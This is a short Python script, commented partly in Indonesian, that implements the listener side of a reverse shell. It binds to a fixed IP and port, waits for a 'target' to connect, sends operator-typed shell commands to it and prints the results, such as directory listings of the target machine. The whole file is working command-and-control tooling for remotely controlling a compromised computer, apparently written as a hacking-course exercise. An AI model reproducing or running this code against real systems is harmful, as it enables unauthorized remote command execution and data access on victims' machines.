import socket
import json


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try: 
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError: 
            continue

def target_communication():
    while True : 
        command = input('* Shell`%s: ' % str(ip))
        # %s bakal ngeprint ip address target
        reliable_send(command)
        if command == 'quit': 
            break 
        #you will stop the server program
        # That means you want to stop communicationg with the target 
        # & you want to close this server program 
        else:   
            result = reliable_recv()
            print(result)
        # Respons dari perintah kami terima menggunakan fungsi ini ke variabel hasil ini dan kemudian kami akan print hasilnya
        # misal perintahnya ls atau dir, maka perintah itu mencantumkan semua file dan folder di dalam direktori, lalu hasil tersebut akan disimpan di dala variabel hasil ini kemudian akan di "print" file dan folder yang ada di dalam direktori target


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.30.90.14', 5555))
print("[+] Listening For The Incoming Connections")
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()